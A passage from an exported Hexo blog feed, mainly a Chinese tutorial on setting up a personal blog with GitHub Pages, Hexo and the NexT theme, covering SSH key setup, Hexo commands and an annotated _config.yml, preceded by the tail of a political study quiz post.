<p>为完成祖国和人民赋予的使命、慷慨奉献自己一切的革命忠诚精神</p>
<p>不畏艰难困苦、始终保持高昂士气的革命乐观主义精神</p>
<p>为了人类和平与正义事业而奋斗的国际主义精神</p>
<p>中共十一届三中全会深远的历史意义主要体现在（　全选）</p>
<p>中国始终支持多边主义、践行多边主义，以（）、（）、精神同世界各国共谋发展。</p>
<p>开放</p>
<p>共赢</p>
<p>合作</p>
]]></content>
      <tags>
        <tag>Others</tag>
      </tags>
  </entry>
  <entry>
    <title>你也想拥有这样的博客吗？</title>
    <url>/Blog-Config-0/</url>
    <content><![CDATA[<p>GitHub&amp;Hexo&amp;NexT Blog 配置过程记录（上）：基本配置</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png" alt="ExiTalk"></p>
<blockquote>
<p>Hi，你目前进入的<a href="https://www.superpung.xyz/">这个博客网站</a>，就是按照这篇文章来配置的。</p>
<p>今天是 2021 年 2 月 11 日，除夕，提前祝看到这里的你新年快乐。<em>（虽然没人看到）</em></p>
<iframe src="//player.bilibili.com/player.html?aid=971338954&bvid=BV1zp4y1W7qf&cid=294929309&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

<p><a href="https://www.superpung.xyz/">这个博客网站</a>最初建成于 2020 年 1 月 14 日左右，陆续由于换了四次电脑，博客也迁移了三次。从建成至今，不知不觉已经过了一年多。一年多来，随着各种软件的升级迭代，每次迁移都意味着需要重新配置新的功能，同时也见证了 Git、Hexo 和 NexT 的发展。</p>
<p>2021.2.10～11，完成了第三次迁移（也许是最后一次迁移），所以打算整理一下一年来搭建博客遇到的各种问题。</p>
<p>目前已经有许多优秀的博客平台，为什么还要自己搭建博客网站？确实，如果你想纯粹地写博客、分享自己的想法、更容易互相交流，那么博客平台是一个很不错的选择。但是，搭建个人的博客网站可以让你拥有一个只属于你的个人空间，它有极高的自由度，你可以绝对地进行改造，并了解一些关于网站前端的知识。借助于各种优秀的插件，它会变得更加简洁而强大。</p>
<p>此博客网站为 <a href="https://hexo.io/zh-cn/">Hexo</a> 框架，依托于 <a href="https://pages.github.com/">GitHub Pages</a> ，使用 <a href="https://theme-next.js.org/">NexT</a> 主题。</p>
</blockquote>
<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="安装-Git"><a href="#安装-Git" class="headerlink" title="安装 Git"></a>安装 Git</h2><ul>
<li><p>Windows：<a href="https://github.com/git-for-windows/git/releases/download/v2.30.1.windows.1/Git-2.30.1-64-bit.exe">点此下载</a>（Git for Windows 2.30.1)</p>
</li>
<li><p>macOS：通过 Homebrew 安装</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">brew install git</span><br></pre></td></tr></table></figure>
<h2 id="安装-Node-js"><a href="#安装-Node-js" class="headerlink" title="安装 Node.js"></a>安装 Node.js</h2></li>
<li><p>Windows：<a href="https://nodejs.org/dist/v14.15.5/node-v14.15.5-x86.msi">点此下载</a>（node v14.15.5 x86）</p>
</li>
<li><p>macOS：<a href="https://nodejs.org/dist/v14.15.5/node-v14.15.5.pkg">点此下载</a>（node v14.15.5）（M1 可通过 Rosetta 2 转译）</p>
</li>
</ul>
<h2 id="注册-GitHub"><a href="#注册-GitHub" class="headerlink" title="注册 GitHub"></a>注册 GitHub</h2><p>注册 <a href="https://github.com/">GitHub</a> 账号（密码不要太简单），创建名为 <code>&#123;username&#125;.github.io</code> 的仓库。</p>
<blockquote>
<p>假设你的 GitHub 用户名为 <code>name</code>，则创建的仓库需命名为 <code>name.github.io</code>。</p>
</blockquote>
<h1 id="配置-Git"><a href="#配置-Git" class="headerlink" title="配置 Git"></a>配置 Git</h1><h2 id="生成-rsa"><a href="#生成-rsa" class="headerlink" title="生成 rsa"></a>生成 rsa</h2><p>Windows 打开 Git Bash，macOS 打开终端（Terminal），检查本机已存在的 ssh 密钥：</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.ssh</span><br></pre></td></tr></table></figure>
<p>Windows 若不存在此文件夹，则创建：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> ~/.ssh</span><br></pre></td></tr></table></figure>
<p>生成 <code>rsa</code>（<code>name@email.com</code> 为你的 GitHub 的邮件地址）：</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;name@email.com&quot;</span></span><br></pre></td></tr></table></figure>
<p>无需设置密码，所以回车、回车、回车。</p>
<p>执行以下命令：</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">cat id_rsa.pub</span><br></pre></td></tr></table></figure>
<p>复制全部（即 <code>id_rsa.pub</code> 文件内容）。</p>
<h2 id="配置-SSH"><a href="#配置-SSH" class="headerlink" title="配置 SSH"></a>配置 SSH</h2><p>打开你的 <a href="https://github.com/">GitHub 主页</a>，点击右上角头像，点击”Settings“进入设置，点击左侧“SSH and GPG keys”，点击右侧“New SSH key”新建密钥。</p>
<p>“Title”随意，将刚才复制的内容粘贴到“Key”处，“Add SSH key”。</p>
<p>此时你可能会收到一封邮件提醒。</p>
<p>本地执行以下命令，测试是否成功：</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
<p>若提示</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">Are you sure you want to <span class="built_in">continue</span> connecting (yes/no)?</span><br></pre></td></tr></table></figure>
<p>输入 “yes”，回车。</p>
<p>若看到：</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">Hi &#123;username&#125;! You’ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure>
<p>说明 SSH 配置成功。</p>
<h2 id="其他配置"><a href="#其他配置" class="headerlink" title="其他配置"></a>其他配置</h2><p>配置你的用户名以及 GitHub 邮箱：</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;&#123;username&#125;&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;name@email.com&quot;</span></span><br></pre></td></tr></table></figure>
<h1 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a>安装 Hexo</h1><p>执行：</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br><span class="line">npm install -g hexo</span><br></pre></td></tr></table></figure>
<p>macOS 可能会提示权限问题，尝试许多其他办法无果后，可以尝试 root 执行（不推荐）：</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">sudo su</span><br><span class="line">npm install -g hexo</span><br></pre></td></tr></table></figure>
<p>执行：</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">hexo version</span><br></pre></td></tr></table></figure>
<p>若正常输出则证明 Hexo 安装成功。</p>
<h1 id="初始化本地-Blog"><a href="#初始化本地-Blog" class="headerlink" title="初始化本地 Blog"></a>初始化本地 Blog</h1><p>创建一个文件夹，作为博客的根目录。</p>
<p>在此根目录中，执行：</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">hexo init</span><br><span class="line">hexo g</span><br><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
<p>修改根目录下 <code>_config.yml</code> 文件，将末尾的 <code>deploy</code> 部分修改为：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">	<span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">	<span class="attr">repository:</span> <span class="string">git@github.com:&#123;username&#125;/&#123;username&#125;.github.io.git</span></span><br><span class="line">	<span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure>
<p>执行：</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<p>部署博客。</p>
<p>访问 <code>https://&#123;username&#125;.github.io</code> ，若出现经典的 <code>landscape</code> 页面则说明初始化成功。</p>
<h1 id="Hexo-基本指令"><a href="#Hexo-基本指令" class="headerlink" title="Hexo 基本指令"></a>Hexo 基本指令</h1><p>后续博客文章的生成、发布等操作均通过 Hexo 指令完成。</p>
<p>下面列出一些 Hexo 的基本指令，其他指令请参考 <a href="https://hexo.io/zh-cn/docs/commands">Hexo 官方文档 - 命令</a>。</p>
<h2 id="init"><a href="#init" class="headerlink" title="init"></a>init</h2><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="keyword">init</span> [folder]</span><br></pre></td></tr></table></figure>
<p>新建一个网站。如果没有设置 <code>folder</code> ，Hexo 默认在目前的文件夹建立网站。</p>
<h2 id="new"><a href="#new" class="headerlink" title="new"></a>new</h2><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="keyword">new</span> [layout] &lt;<span class="built_in">title</span>&gt;</span><br></pre></td></tr></table></figure>
<p>新建一篇文章。如果没有设置 <code>layout</code> 的话，默认使用根目录下 <code>_config.yml</code> 中的 <code>default_layout</code> 参数代替。如果标题包含空格的话，请使用引号括起来。</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="keyword">new</span> <span class="string">&quot;post title with whitespace&quot;</span></span><br></pre></td></tr></table></figure>
<p>默认情况下，Hexo 会使用文章的标题来决定文章文件的路径。</p>
<h2 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h2><figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="keyword">generate</span></span><br></pre></td></tr></table></figure>
<p>生成静态文件。</p>
<table>
<thead>
<tr>
<th align="left">选项</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>-d</code>, <code>--deploy</code></td>
<td align="left">文件生成后立即部署网站</td>
</tr>
<tr>
<td align="left"><code>-w</code>, <code>--watch</code></td>
<td align="left">监视文件变动</td>
</tr>
<tr>
<td align="left"><code>-b</code>, <code>--bail</code></td>
<td align="left">生成过程中如果发生任何未处理的异常则抛出异常</td>
</tr>
<tr>
<td align="left"><code>-f</code>, <code>--force</code></td>
<td align="left">强制重新生成文件 Hexo 引入了差分机制，如果 <code>public</code> 目录存在，那么 <code>hexo g</code> 只会重新生成改动的文件。 使用该参数的效果接近 <code>hexo clean &amp;&amp; hexo generate</code></td>
</tr>
<tr>
<td align="left"><code>-c</code>, <code>--concurrency</code></td>
<td align="left">最大同时生成文件的数量，默认无限制</td>
</tr>
</tbody></table>
<p>该命令可以简写为</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>hexo g</span><br></pre></td></tr></table></figure>
<h2 id="publish"><a href="#publish" class="headerlink" title="publish"></a>publish</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">$ hexo publish [layout] <span class="tag">&lt;<span class="name">filename</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>发表草稿。</p>
<h2 id="server"><a href="#server" class="headerlink" title="server"></a>server</h2><figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="keyword">server</span></span><br></pre></td></tr></table></figure>
<p>启动服务器。默认情况下，访问网址为： <code>http://localhost:4000/</code>。</p>
<table>
<thead>
<tr>
<th align="left">选项</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>-p</code>, <code>--port</code></td>
<td align="left">重设端口</td>
</tr>
<tr>
<td align="left"><code>-s</code>, <code>--static</code></td>
<td align="left">只使用静态文件</td>
</tr>
<tr>
<td align="left"><code>-l</code>, <code>--log</code></td>
<td align="left">启动日记记录，使用覆盖记录格式</td>
</tr>
</tbody></table>
<h2 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a>deploy</h2><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>hexo deploy</span><br></pre></td></tr></table></figure>
<p>部署网站。</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>-g</code>, <code>--generate</code></td>
<td align="left">部署之前预先生成静态文件</td>
</tr>
</tbody></table>
<p>该命令可以简写为：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>hexo d</span><br></pre></td></tr></table></figure>
<h2 id="render"><a href="#render" class="headerlink" title="render"></a>render</h2><figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">$ hexo render &lt;file1&gt; [file2] ...</span><br></pre></td></tr></table></figure>
<p>渲染文件。</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>-o</code>, <code>--output</code></td>
<td align="left">设置输出路径</td>
</tr>
</tbody></table>
<h2 id="migrate"><a href="#migrate" class="headerlink" title="migrate"></a>migrate</h2><figure class="highlight elm"><table><tr><td class="code"><pre><span class="line">$ hexo migrate &lt;<span class="keyword">type</span>&gt;</span><br></pre></td></tr></table></figure>
<p>从其他<strong>博客系统</strong> <a href="https://hexo.io/zh-cn/docs/migration">迁移内容</a>。</p>
<h2 id="clean"><a href="#clean" class="headerlink" title="clean"></a>clean</h2><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>hexo clean</span><br></pre></td></tr></table></figure>
<p>清除缓存文件 (<code>db.json</code>) 和已生成的静态文件 (<code>public</code>)。</p>
<p>在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</p>
<h2 id="list"><a href="#list" class="headerlink" title="list"></a>list</h2><figure class="highlight elm"><table><tr><td class="code"><pre><span class="line">$ hexo list &lt;<span class="keyword">type</span>&gt;</span><br></pre></td></tr></table></figure>
<p>列出网站资料。</p>
<h2 id="version"><a href="#version" class="headerlink" title="version"></a>version</h2><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="built_in">version</span></span><br></pre></td></tr></table></figure>
<p>显示 Hexo 版本。</p>
<h1 id="Hexo-基本配置"><a href="#Hexo-基本配置" class="headerlink" title="Hexo 基本配置"></a>Hexo 基本配置</h1><p>博客根目录初始化后，文件结构如下：</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── <span class="variable">_config</span>.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source</span><br><span class="line">|   ├── <span class="variable">_drafts</span></span><br><span class="line">|   └── <span class="variable">_posts</span></span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure>
<p>其中：</p>
<ul>
<li><code>package.json</code> 是应用程序的信息。</li>
<li><code>scaffolds</code> 是模版文件夹，Hexo 会根据 <code>scaffold</code> 来建立文件，是在新建的文章文件中默认填充的内容。</li>
<li><code>source</code> 是资源文件夹，即存放用户资源的地方。除 <code>_posts</code> 文件夹之外，开头命名为 <code>_</code> (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 <code>public</code> 文件夹，而其他文件会被拷贝过去。</li>
<li><code>themes</code> 是主题文件夹，Hexo 会根据主题来生成静态页面。</li>
</ul>
<p>而 <code>_config.yml</code> 就是博客网站的配置：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Hexo Configuration</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/configuration.html</span></span><br><span class="line"><span class="comment">## Source: https://github.com/hexojs/hexo/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Site 网站基本信息设置</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Hexo</span> <span class="comment"># 网站的标题</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">&#x27;&#x27;</span> <span class="comment"># 网站的副标题</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">&#x27;&#x27;</span> <span class="comment"># 网站的描述</span></span><br><span class="line"><span class="attr">keywords:</span> <span class="comment"># 网站的关键词，支持多个关键词</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">John</span> <span class="string">Doe</span> <span class="comment"># 你的名字，同时会出现在主题显示文章的作者</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">en</span> <span class="comment"># 网站使用的语言，中国大陆一般设置为 zh-Hans 或 zh-CN，不同主题的要求可能不同</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">&#x27;&#x27;</span> <span class="comment"># 网站的时区，中国大陆一般设置为 Asia/Shanghai</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL URL 设置</span></span><br><span class="line"><span class="comment">## If your site is put in a subdirectory, set url as &#x27;http://example.com/child&#x27; and root as &#x27;/child/&#x27;</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">http://example.com</span> <span class="comment"># 网址，以 http:// 或 https:// 开头</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span> <span class="comment"># 网站根目录，如果博客不是在上面网站的根目录，可以修改此部分</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span> <span class="comment"># 文章的永久链接的格式，嫌长可以设置为 :title/，即文章的标题</span></span><br><span class="line"><span class="attr">permalink_defaults:</span> <span class="comment"># 永久链接中各部分的默认值</span></span><br><span class="line"><span class="attr">pretty_urls:</span> <span class="comment"># 美化 URL</span></span><br><span class="line">  <span class="attr">trailing_index:</span> <span class="literal">true</span> <span class="comment"># Set to false to remove trailing &#x27;index.html&#x27; from permalinks 字面意思 我一般设置为 false</span></span><br><span class="line">  <span class="attr">trailing_html:</span> <span class="literal">true</span> <span class="comment"># Set to false to remove trailing &#x27;.html&#x27; from permalinks 字面意思 我一般设置为 false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Directory 目录设置，一般不用改</span></span><br><span class="line"><span class="attr">source_dir:</span> <span class="string">source</span> <span class="comment"># 资源文件夹，这个文件夹用来存放内容</span></span><br><span class="line"><span class="attr">public_dir:</span> <span class="string">public</span> <span class="comment"># 公共文件夹，这个文件夹用于存放 generate 生成的站点文件</span></span><br><span class="line"><span class="attr">tag_dir:</span> <span class="string">tags</span> <span class="comment"># 标签文件夹</span></span><br><span class="line"><span class="attr">archive_dir:</span> <span class="string">archives</span> <span class="comment"># 归档文件夹</span></span><br><span class="line"><span class="attr">category_dir:</span> <span class="string">categories</span> <span class="comment"># 分类文件夹</span></span><br><span class="line"><span class="attr">code_dir:</span> <span class="string">downloads/code</span> <span class="comment"># Include code 文件夹，source_dir 下的子目录</span></span><br><span class="line"><span class="attr">i18n_dir:</span> <span class="string">:lang</span> <span class="comment"># 国际化（internationalization，i18n）文件夹</span></span><br><span class="line"><span class="attr">skip_render:</span> <span class="comment"># 跳过指定文件的渲染。匹配到的文件将会被不做改动地复制到 public 目录中。你可以使用 glob 表达式来匹配路径：如 &quot;mypage/**/*&quot; 和 &quot;_post/test-post.md&quot;。如果文件少你也可以通过在对应文件开头加上“layout: false来屏蔽渲染</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Writing 文章设置</span></span><br><span class="line"><span class="attr">new_post_name:</span> <span class="string">:title.md</span> <span class="comment"># File name of new posts 新文章的文件名</span></span><br><span class="line"><span class="attr">default_layout:</span> <span class="string">post</span> <span class="comment"># 预设布局，前面说过</span></span><br><span class="line"><span class="attr">titlecase:</span> <span class="literal">false</span> <span class="comment"># Transform title into titlecase 把标题转换为 title case</span></span><br><span class="line"><span class="attr">external_link:</span> <span class="comment"># 在新标签页中打开链接</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># Open external links in new tab 在新标签页中打开链接</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">site</span> <span class="comment"># Apply to the whole site 对整个网站（site）生效或仅对文章（post）生效</span></span><br><span class="line">  <span class="attr">exclude:</span> <span class="string">&#x27;&#x27;</span> <span class="comment"># 需要排除的域名。主域名和子域名如 www 需分别配置</span></span><br><span class="line"><span class="attr">filename_case:</span> <span class="number">0</span> <span class="comment"># 把文件名称转换为 (1) 小写或 (2) 大写</span></span><br><span class="line"><span class="attr">render_drafts:</span> <span class="literal">false</span> <span class="comment"># 显示草稿</span></span><br><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">false</span> <span class="comment"># 新建文章 md 的时候是否再新建一个同名文件夹用于存放图片等引用文件</span></span><br><span class="line"><span class="attr">relative_link:</span> <span class="literal">false</span> <span class="comment"># 把链接改为与根目录的相对位址</span></span><br><span class="line"><span class="attr">future:</span> <span class="literal">true</span> <span class="comment"># 显示未来的文章</span></span><br><span class="line"><span class="attr">highlight:</span> <span class="comment"># Highlight.js 代码块的设置</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">auto_detect:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">tab_replace:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hljs:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">prismjs:</span> <span class="comment"># PrismJS 代码块的设置</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">preprocess:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">tab_replace:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认情况下，Hexo 生成的超链接都是绝对地址。</span></span><br><span class="line"><span class="comment"># 例如，如果您的网站域名为 example.com,您有一篇文章名为 hello，那么绝对链接可能像这样：</span></span><br><span class="line"><span class="comment"># http://example.com/hello.html，它是绝对于域名的。</span></span><br><span class="line"><span class="comment"># 相对链接像这样：/hello.html，</span></span><br><span class="line"><span class="comment"># 也就是说，无论用什么域名访问该站点，都没有关系，这在进行反向代理时可能用到。</span></span><br><span class="line"><span class="comment"># 通常情况下，建议使用绝对地址。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Home page setting 不用改</span></span><br><span class="line"><span class="comment"># path: Root path for your blogs index page. (default = &#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># per_page: Posts displayed per page. (0 = disable pagination)</span></span><br><span class="line"><span class="comment"># order_by: Posts order. (Order by date descending by default)</span></span><br><span class="line"><span class="attr">index_generator:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="number">10</span></span><br><span class="line">  <span class="attr">order_by:</span> <span class="string">-date</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Category &amp; Tag 分类和标签，不用改</span></span><br><span class="line"><span class="attr">default_category:</span> <span class="string">uncategorized</span> <span class="comment"># 默认分类</span></span><br><span class="line"><span class="attr">category_map:</span> <span class="comment"># 分类别名</span></span><br><span class="line"><span class="attr">tag_map:</span> <span class="comment"># 标签别名</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Metadata elements 不用改</span></span><br><span class="line"><span class="comment">## https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta</span></span><br><span class="line"><span class="attr">meta_generator:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Date / Time format 日期时间格式，不用改</span></span><br><span class="line"><span class="comment">## Hexo uses Moment.js to parse and display date</span></span><br><span class="line"><span class="comment">## You can customize the date format as defined in</span></span><br><span class="line"><span class="comment">## http://momentjs.com/docs/#/displaying/format/</span></span><br><span class="line"><span class="attr">date_format:</span> <span class="string">YYYY-MM-DD</span> <span class="comment"># 日期格式</span></span><br><span class="line"><span class="attr">time_format:</span> <span class="string">HH:mm:ss</span> <span class="comment"># 时间格式</span></span><br><span class="line"><span class="comment">## updated_option supports &#x27;mtime&#x27;, &#x27;date&#x27;, &#x27;empty&#x27;</span></span><br><span class="line"><span class="attr">updated_option:</span> <span class="string">&#x27;mtime&#x27;</span> <span class="comment"># 当 Front Matter 中没有指定 updated 时 updated 的取值</span></span><br><span class="line"><span class="comment"># mtime: 使用文件的最后修改时间。这是从 Hexo 3.0.0 开始的默认行为。</span></span><br><span class="line"><span class="comment"># date: 使用 date 作为 updated 的值。可被用于 Git 工作流之中，因为使用 Git 管理站点时，文件的最后修改日期常常会发生改变</span></span><br><span class="line"><span class="comment"># empty: 直接删除 updated。使用这一选项可能会导致大部分主题和插件无法正常工作。</span></span><br><span class="line"><span class="comment"># use_date_for_updated 选项已经被废弃，将会在下个重大版本发布时去除。请改为使用 updated_option: &#x27;date&#x27;。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pagination 分页，不用改</span></span><br><span class="line"><span class="comment">## Set per_page to 0 to disable pagination</span></span><br><span class="line"><span class="attr">per_page:</span> <span class="number">10</span> <span class="comment"># 每页显示的文章量 (0 = 关闭分页功能)</span></span><br><span class="line"><span class="attr">pagination_dir:</span> <span class="string">page</span> <span class="comment"># 分页目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Include / Exclude file(s) 包括或不包括目录和文件，让 Hexo 进行处理或忽略某些目录和文件夹。你可以使用 glob 表达式对目录和文件进行匹配。</span></span><br><span class="line"><span class="comment">## include:/exclude: options only apply to the &#x27;source/&#x27; folder</span></span><br><span class="line"><span class="attr">include:</span> <span class="comment"># Hexo 默认会忽略隐藏文件和文件夹（包括名称以下划线和 . 开头的文件和文件夹，Hexo 的 _posts 和 _data 等目录除外）。通过设置此字段将使 Hexo 处理他们并将它们复制到 source 目录下。</span></span><br><span class="line"><span class="attr">exclude:</span> <span class="comment"># Hexo 会忽略这些文件和目录</span></span><br><span class="line"><span class="attr">ignore:</span> <span class="comment"># Ignore files/folders</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions 扩展</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">landscape</span> <span class="comment"># 当前主题名称（主题文件夹下特定主题文件夹的名字），false 则禁用主题</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Deployment 部署设置，必须更改，前面说了</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>今年迁移博客的时候发现，Hexo 升级至 5.0.0 以上后，新增加了独立的 <code>_config.[theme].yml</code> 文件，在站点根目录下，支持 <code>yml</code> 或 <code>json</code> 格式。需要配置站点 <code>_config.yml</code> 文件中的 <code>theme</code> 以供 Hexo 寻找 <code>_config.[theme].yml</code> 文件。</p>
<blockquote>
<p>我们强烈建议你将所有的主题配置集中在一处。如果你不得不在多处配置你的主题，那么这些信息对你将会非常有用：Hexo 在合并主题配置时，Hexo 配置文件中的 <code>theme_config</code> 的优先级最高，其次是 <code>_config.[theme].yml</code> 文件，最后是位于主题目录下的 <code>_config.yml</code> 文件。</p>
</blockquote>
<h1 id="安装-NexT"><a href="#安装-NexT" class="headerlink" title="安装 NexT"></a>安装 NexT</h1><p>经过上述操作，基本上已经配置完成了。如果追求美观以及其他高级功能，可以继续看。</p>
<p>Hexo 的默认主题是 landscape，推荐使用 <a href="https://theme-next.js.org/">NexT 主题</a>。</p>
<p><img src="https://theme-next.js.org/images/next-schemes-dark.png"></p>
<p>如果搜索 NexT 主题，会发现在 GitHub 上有三个 NexT 主题的仓库：</p>
<ul>
<li>一个是 v6.0.0 之前版本的<a href="https://github.com/iissnan/hexo-theme-next">个人仓库</a>，主题原作者停止维护。</li>
<li>后来有些人单独创立了一个名为 <a href="https://github.com/theme-next/">theme-next</a> 的团队，v6.0.0 至 v7.8.0 版本主题在这个<a href="https://github.com/theme-next/hexo-theme-next">仓库</a>中。然而，因 theme-next 团队管理者自 2019 年 10 月起长期不在线，管理者也没有给其他成员足够的权限，导致仓库管理出现很多问题。</li>
<li>自 2020 年 5 月起，theme-next 团队部分成员迁移至 <a href="https://github.com/next-theme/">next-theme</a>，新团队开发的 NexT 版本为 v8.0.0 版本。</li>
</ul>
<p>因此目前 NexT 主题共有三个仓库：</p>
<ul>
<li>2014-2017：<a href="https://github.com/iissnan/hexo-theme-next">https://github.com/iissnan/hexo-theme-next</a></li>
<li>2018-2019：<a href="https://github.com/theme-next/hexo-theme-next">https://github.com/theme-next/hexo-theme-next</a></li>
<li>2020-：<a href="https://github.com/next-theme/hexo-theme-next">https://github.com/next-theme/hexo-theme-next</a></li>
</ul>
<p>建议下载并安装最新版本：</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">npm install hexo-theme-next</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注：git clone 下来的代码可能为旧版本（7.8.0）。</p>
</blockquote>
<p>此时博客根目录下的 <code>theme</code> 文件夹内增加了 <code>next</code> 主题文件夹，将“站点配置文件”的 <code>theme</code> 改为 <code>next</code> ，安装完成。</p>
<h1 id="NexT-基本配置"><a href="#NexT-基本配置" class="headerlink" title="NexT 基本配置"></a>NexT 基本配置</h1><p>上面的 Hexo 基本配置部分已经分析了“站点配置文件”，同理配置 NexT 主题需要修改“主题配置文件”，即 <code>next</code> 文件夹下的 <code>_config.yml</code> 。</p>
